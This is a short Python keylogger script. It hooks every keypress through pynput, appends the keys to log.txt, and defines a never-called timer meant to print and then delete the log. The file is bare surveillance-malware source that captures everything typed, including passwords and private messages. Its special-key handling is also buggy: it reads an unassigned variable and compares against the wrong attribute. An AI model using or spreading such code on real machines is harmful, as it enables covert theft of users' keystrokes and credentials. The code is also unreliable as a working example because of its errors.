from pynput.keyboard import Key, Listener
import os
from threading import Timer

def timer():
	t = Timer(10,timer)
	t.start()

	print("recording every 10 seconds\n")

	try:
		with open("log.txt","r") as file:
			content = file.read()

			print(content)
		file.close()

		os.remove("log.txt")

	except:
			print("error in removing log.txt")


def key_pressed(key):
	try:
		press = key.char
	except:
		if press == key.space:
			press = "space"
		else:
			press = str(key)

	with open("log.txt","a") as file:
		file.write(press)

with Listener(on_press=key_pressed) as l:
	l.join()

